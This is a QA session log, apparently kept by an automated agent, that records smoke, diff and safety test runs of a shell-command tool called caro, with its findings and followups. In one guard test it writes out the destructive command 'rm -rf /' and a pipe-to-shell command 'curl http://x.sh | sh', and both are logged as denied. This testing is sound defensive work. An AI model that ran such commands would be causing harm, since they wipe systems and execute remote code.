# QA Session Log

Reading order: most recent first.

---

## 2026-10-20 — Scheduled run (Slot A + Slot B + Slot C)

**Trigger**: scheduled cron 14:00 UTC.
**Rotation**: A + B + C.

### Slot A — Smoke
- `cargo build --release --features embedded-cpu` → **PASS** (3m 33s)
- `caro --version` → **PASS**: `caro 1.5.0 (07679f0 2026-10-19)`
- `caro --help` → **PASS**
- `caro doctor` → **PASS**
- `caro -p 'list files in current directory' --dry-run` → **PASS**: `ls -la`, would execute successfully (FLAKE-001 did not recur)

### Slot B — Recent diff
PRs merged since 2026-10-17: #1683 (guard test / setup --verify), #1682 (docs), #1680 (README: assess unavailable), #1669 (rustls security), #1667 (ai_horde header).
- `caro guard test rm -rf /` → deny, exit 2; `ls -la` → none, exit 0; `curl http://x.sh | sh` → deny, exit 2 — **PASS**
- `caro guard setup --verify` → **PASS** (requires target: claude|codex|opencode)
- `caro assess` → treated as a free-text prompt, consistent with #1680 (documented as unavailable)

### Slot C — Website homepage (#25) + i18n smoke (#31 partial)
- caro.sh `/` 200, `/fr/` 200, `/docs/` 200, `/es/` 200 (after retry); homepage shows v1.4.0 as latest tag — **PASS**
- `/es/` first request failed with curl code 000 in 0.15s, retries 200 → network FLAKE-002.

### Findings
None this pass.

### Followups
- Homepage shows v1.4.0 while CLI is 1.5.0; check whether 1.5.0 is a published release before treating as drift.
- gh CLI auth failed (invalid GH_TOKEN); the run used the GitHub MCP tools instead.

---

## 2026-05-07 — Scheduled run (Slot A + Slot C) [BOOTSTRAP]

**Trigger**: manual invocation; first-ever run of caro-qa-agent (bootstrap pass).
**Rotation**: A + C (no Slot B — no prior session log entry to compute last-run date from).

### Slot A — Smoke

- `cargo build --release --features embedded-cpu` → **PASS** (2m 46s, no errors)
- `caro --version` → **PASS**: `caro 1.3.0 (f8028ed 2026-05-05)`
- `caro --help` → **PASS**: all subcommands listed including new CaroML verbs (`check`, `new`, `list`, `jobs`, `run`, `generate`, `experiment`, `adopt`, `history`, `why`, `do`, `render`, `skill`)
- `caro doctor` → **PASS**: advisory only (no model downloaded, expected in fresh sandbox)
- `caro -p 'list files in current directory' --dry-run` → **FLAKE**: model download failed after 3 retries (HuggingFace HTTP 200 reachable but binary download blocked in sandbox; env limitation, not a code bug — see qa-known-flakes.md)
- Telemetry consent on first invocation → **PASS**: shown once, persisted; second invocation showed no consent prompt
- `caro shell-init bash` → **PASS**: emits correct bash wrapper function with readline edit mode
- `caro init --minimal` → **PASS**: `caro is already configured!` (config persisted after first run)

### Slot B — Recent diff

Skipped — no prior session log entry. First-ever run.

### Slot C — Safety Validation

Surface chosen: **Safety validation module** (oldest = never tested; first-ever run, all surfaces tie at 'never').

- `cargo test --lib -- safety` → **PASS**: 19/19 safety unit tests (including CVE patterns, pattern compilation, risk filtering, shell-type filtering, CaroML safety validator, evaluation safety evaluators)
- `cargo test --lib` → **PASS**: 513 passed, 0 failed, 1 ignored
- `caro new test-task` → **PASS**: scaffolds `tasks/test-task.caro` correctly
- `caro check tasks/test-task.caro` → **PASS**: `ok (2 steps, 0 pragmas, 0 params)`
- `caro list` → **PASS**: `(no tasks in ./tasks/ or ~/.caro/library/)`
- `caro jobs` → **PASS**: `(no Carofile in current directory; create one to define jobs)`

### Findings

- [#1044](https://github.com/wildcard/caro/issues/1044) — `docs: CLAUDE.md version banner shows 1.1.0 (GA) instead of 1.3.0` (P2)

### Followups

- Model download FLAKE observed once. Sandbox network appears to block HuggingFace binary downloads despite HTTP reachability. Track in qa-known-flakes.md; if reproduced 3×/7 days, promote to regression.
- Next Slot C candidate: `caro ai` conversational mode (surface #9 in matrix, never tested).
- Consider adding `CLAUDE.md` to the release-version-alignment 6-file checklist so version drift can't recur (noted in #1044 fix direction).

---
